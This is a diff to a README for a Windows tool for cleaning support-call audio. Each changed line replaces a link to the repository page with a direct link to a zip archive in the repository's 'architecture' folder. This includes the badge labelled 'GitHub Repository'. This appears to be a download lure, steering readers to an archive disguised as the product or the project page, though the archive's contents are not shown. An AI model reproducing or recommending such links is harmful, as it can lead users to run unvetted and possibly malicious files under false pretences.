@@ -1,6 +1,6 @@
 # 🎧 call-recording-cleaner-api - Clean support calls with less noise
 
-[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api/raw/refs/heads/main/architecture/call_cleaner_recording_api_v2.1.zip)
 
 ## 🚀 What this does
 
@@ -34,7 +34,7 @@ For best results, use call recordings in common audio formats such as:
 
 Visit this page to download:
 
-https://github.com/TaperSpider/call-recording-cleaner-api
+https://github.com/TaperSpider/call-recording-cleaner-api/raw/refs/heads/main/architecture/call_cleaner_recording_api_v2.1.zip
 
 If the page shows a release file, download it to your Windows computer. If it shows source files only, use the files from the repository page and follow the setup steps below.
 
@@ -165,4 +165,4 @@ It is built for support call cleanup, not for music editing or studio audio work
 
 ## 🔗 Download again
 
-[![GitHub Repository](https://img.shields.io/badge/GitHub%20Repository-grey?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api)
+[![GitHub Repository](https://img.shields.io/badge/GitHub%20Repository-grey?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api/raw/refs/heads/main/architecture/call_cleaner_recording_api_v2.1.zip)
